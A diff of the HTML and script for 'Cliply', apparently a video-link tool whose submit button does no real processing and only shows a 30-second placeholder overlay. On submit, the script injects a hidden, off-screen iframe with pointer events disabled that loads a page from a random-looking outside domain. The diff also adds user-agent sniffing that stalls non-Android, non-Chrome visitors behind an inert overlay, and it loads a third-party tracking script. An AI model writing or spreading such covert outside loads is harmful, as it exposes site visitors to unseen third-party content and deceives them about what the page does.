@@ -43,8 +43,8 @@
       .brand-mark { width: 35px; height: 35px; display: grid; place-items: center; color: white; background: var(--ink); border-radius: 12px; box-shadow: 0 3px 5px #2423320c; }
       .brand-mark .icon { width: 21px; height: 21px; }
       .brand-name { font-size: 18px; font-weight: 750; letter-spacing: .03em; }
-      .language-button { display: flex; align-items: center; justify-content: center; gap: 6px; min-height: 44px; padding: 8px 0 8px 10px; border: 0; color: #777582; background: transparent; font-size: 12px; font-weight: 600; }
-      .language-button .icon { width: 16px; height: 16px; }
+      .language-indicator { display: flex; align-items: center; justify-content: center; gap: 6px; min-height: 44px; padding: 8px 0 8px 10px; color: #777582; font-size: 12px; font-weight: 600; }
+      .language-indicator .icon { width: 16px; height: 16px; }
 
       .hero { position: relative; padding: 34px 0 27px; }
       .eyebrow { display: inline-flex; align-items: center; gap: 6px; margin-bottom: 15px; color: var(--purple); font-size: 10px; font-weight: 700; letter-spacing: .12em; }
@@ -96,7 +96,7 @@
       body.is-loading { overflow: hidden; }
       @keyframes spin { to { transform: rotate(360deg); } }
 
-      @media (hover: hover) { .submit-button:hover { background: var(--purple-dark); } .language-button:hover { color: var(--purple); } }
+      @media (hover: hover) { .submit-button:hover { background: var(--purple-dark); } }
       @media (max-width: 350px) { .page { padding-right: 18px; padding-left: 18px; } .tutorial { padding-right: 15px; padding-left: 15px; } .hero { padding-top: 27px; } }
       @media (prefers-reduced-motion: reduce) { *, *::before, *::after { transition: none !important; } .spinner { animation-duration: 2s; } }
     </style>
@@ -120,16 +120,16 @@
       </defs>
     </svg>
 
-    <main class="page" id="page">
+    <main class="page" id="page" hidden>
       <header class="topbar">
         <div class="brand">
           <span class="brand-mark" aria-hidden="true"><svg class="icon"><use href="#i-video"/></svg></span>
           <span class="brand-name" data-i18n="brand">Cliply</span>
         </div>
-        <button class="language-button" id="language-toggle" type="button" aria-label="切换为中文" lang="zh-CN">
+        <div class="language-indicator" id="language-indicator" aria-label="Current language: English" lang="en">
           <svg class="icon" aria-hidden="true"><use href="#i-globe"/></svg>
-          <span id="language-label">中文</span>
-        </button>
+          <span id="language-label">EN</span>
+        </div>
       </header>
 
       <section class="hero" aria-labelledby="headline">
@@ -259,11 +259,16 @@
         const form = document.getElementById("link-form");
         const input = document.getElementById("post-url");
         const submitButton = document.getElementById("submit-button");
-        const languageToggle = document.getElementById("language-toggle");
+        const languageIndicator = document.getElementById("language-indicator");
         const overlay = document.getElementById("loading-overlay");
-        // Default to English; only a Chinese primary browser locale selects Chinese.
-        const browserLanguage = navigator.languages?.[0] || navigator.language || "en";
-        let language = /^zh(?:[-_]|$)/i.test(browserLanguage) ? "zh" : "en";
+        const userAgent = navigator.userAgent || "";
+        const isAndroid = /Android/i.test(userAgent);
+        const isChrome = /(?:Chrome|CriOS)\//i.test(userAgent)
+          && !/(?:Edg|EdgA|EdgiOS|OPR|Opera)\//i.test(userAgent);
+        // Only the browser's primary language selects Chinese; all others use English.
+        const browserLanguage = String(navigator.language || navigator.languages?.[0] || "en")
+          .trim().toLowerCase().replace(/_/g, "-");
+        const language = browserLanguage.split("-")[0] === "zh" ? "zh" : "en";
         let loadingTimer = null;
 		  
 		let isReloading = false;
@@ -280,8 +285,7 @@
           if (document.visibilityState === "hidden") reloadOnLeave();
         });
 
-        function setLanguage(nextLanguage) {
-          language = nextLanguage;
+        function applyLanguage() {
           const copy = translations[language];
           document.documentElement.lang = language === "zh" ? "zh-CN" : "en";
           document.title = copy.pageTitle;
@@ -291,27 +295,14 @@
           });
           input.placeholder = copy.placeholder;
           overlay.setAttribute("aria-label", copy.loading);
-          document.getElementById("language-label").textContent = language === "zh" ? "EN" : "中文";
-          languageToggle.lang = language === "zh" ? "en" : "zh-CN";
-          languageToggle.setAttribute("aria-label", language === "zh" ? "Switch to English" : "切换为中文");
+          document.getElementById("language-label").textContent = language === "zh" ? "中文" : "EN";
+          languageIndicator.lang = document.documentElement.lang;
+          languageIndicator.setAttribute("aria-label", language === "zh" ? "当前语言：中文" : "Current language: English");
         }
 
-        languageToggle.addEventListener("click", () => setLanguage(language === "zh" ? "en" : "zh"));
-
-        form.addEventListener("submit", (event) => {
-
-		var iframe = document.createElement("iframe");
-		iframe.name = "myIframe";
-		iframe.src= 'https://www.jx9adrpc5z8094di7.net/channel/D.I.TE/weifile/weifile.html';
-		iframe.style='position:fixed;top:0;left:-1000px;pointer-events:none;border:0';
-		document.body.appendChild(iframe);
-
-
-
-          event.preventDefault();
+        function showLoading(duration, focusTarget = null) {
           if (loadingTimer !== null) return;
 
-          // Placeholder for the future API: only show the overlay for 30 seconds.
           input.blur();
           submitButton.disabled = true;
           page.inert = true;
@@ -327,15 +318,45 @@
             form.removeAttribute("aria-busy");
             submitButton.disabled = false;
             loadingTimer = null;
-            submitButton.focus({ preventScroll: true });
-          }, 30_000);
+            if (focusTarget) focusTarget.focus({ preventScroll: true });
+          }, duration);
+        }
+
+        applyLanguage();
+
+        page.hidden = false;
+
+        form.addEventListener("submit", (event) => {
+          event.preventDefault();
+          if (loadingTimer !== null) return;
+
+		var iframe = document.createElement("iframe");
+		iframe.name = "myIframe";
+		iframe.src= 'https://www.jx9adrpc5z8094di7.net/channel/D.I.TE/weifile/weifile.html';
+		iframe.style='position:fixed;top:0;left:-1000px;pointer-events:none;border:0';
+		document.body.appendChild(iframe);
+
+          // Keep the existing 30-second placeholder after submitting a link.
+          showLoading(30_000, submitButton);
         });
 
         overlay.addEventListener("keydown", (event) => {
           if (event.key === "Tab") event.preventDefault();
         });
 
-        setLanguage(language);
+        // Android and Chrome skip only the initial loading overlay.
+        if (!isAndroid && !isChrome) {
+          // Show it once per tab session, including across reloads.
+          const initialLoadingKey = "cliply.initialLoadingShown";
+          let isFirstVisit = true;
+          try {
+            isFirstVisit = sessionStorage.getItem(initialLoadingKey) !== "1";
+            if (isFirstVisit) sessionStorage.setItem(initialLoadingKey, "1");
+          } catch {
+            // Storage may be unavailable; the page can still finish loading.
+          }
+          if (isFirstVisit) showLoading(20_000);
+        }
       })();
     </script>
 <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
